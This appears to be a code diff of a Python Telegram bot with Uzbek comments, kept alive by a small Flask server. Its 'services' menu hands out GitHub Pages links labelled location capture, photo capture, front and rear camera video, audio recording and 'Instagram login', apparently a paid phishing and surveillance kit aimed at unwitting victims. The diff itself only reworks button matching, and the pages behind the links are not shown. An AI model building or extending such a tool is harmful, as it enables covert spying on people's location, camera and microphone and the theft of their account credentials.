@@ -4,7 +4,7 @@ import os
 from flask import Flask
 from threading import Thread
 
-# Render port xatosi bermasligi uchun server
+# Render o'chirib qo'ymasligi uchun veb-server
 app = Flask('')
 @app.route('/')
 def home():
@@ -24,7 +24,6 @@ URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"
 
 bot = telebot.TeleBot(TOKEN)
 
-# ASOSIY MENYU
 def main_menu():
     kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     kb.add(types.KeyboardButton("🔐 Xizmatlar"), types.KeyboardButton("💼 Mening hisobim"))
@@ -32,7 +31,6 @@ def main_menu():
     kb.add(types.KeyboardButton("💳 To'lov qilish"))
     return kb
 
-# XIZMATLAR MENYUSI
 def services_menu():
     kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     kb.add(types.KeyboardButton("📍 Lokatsiya olish"), types.KeyboardButton("📸 Rasm olish"))
@@ -47,32 +45,25 @@ def start(m):
 
 @bot.message_handler(func=lambda m: True)
 def handle_all(m):
-    # Tugma matnini aniq tekshirish (Emoji bilan birga)
-    if m.text == "🔐 Xizmatlar":
+    # 'in' operatori orqali emoji bo'lsa ham matnni topamiz
+    text = m.text
+    if "Xizmatlar" in text:
         bot.send_message(m.chat.id, "Bo'limni tanlang:", reply_markup=services_menu())
-    
-    elif m.text == "⬅️ Asosiy menyu":
-        bot.send_message(m.chat.id, "Asosiy menyuga qaytdingiz:", reply_markup=main_menu())
-
-    elif m.text == "📸 Rasm olish":
+    elif "Asosiy menyu" in text:
+        bot.send_message(m.chat.id, "Asosiy menyu:", reply_markup=main_menu())
+    elif "Rasm olish" in text:
         bot.send_message(m.chat.id, f"Havola: {URL}/index.html")
-
-    elif m.text == "📍 Lokatsiya olish":
+    elif "Lokatsiya olish" in text:
         bot.send_message(m.chat.id, f"Havola: {URL}/index-1.html")
-
-    elif m.text == "🎥 Old kamera video":
+    elif "Old kamera video" in text:
         bot.send_message(m.chat.id, f"Havola: {URL}/index-2.html")
-
-    elif m.text == "🎬 Orqa kamera video":
-        # GitHub'dagi fayl nomiga mos ravishda (probel va nuqta bilan)
+    elif "Orqa kamera video" in text:
         bot.send_message(m.chat.id, f"Havola: {URL}/Orqa%20kamera%20video%20.html")
-
-    elif m.text == "🔑 Instagram login":
+    elif "Instagram login" in text:
         bot.send_message(m.chat.id, f"Havola: {URL}/instagram.html")
-
-    elif m.text == "🎵 Audio yozish":
+    elif "Audio yozish" in text:
         bot.send_message(m.chat.id, f"Havola: {URL}/audio.html")
 
 if __name__ == "__main__":
-    keep_alive()
+    keep_alive() # Serverni yoqish
     bot.polling(none_stop=True)
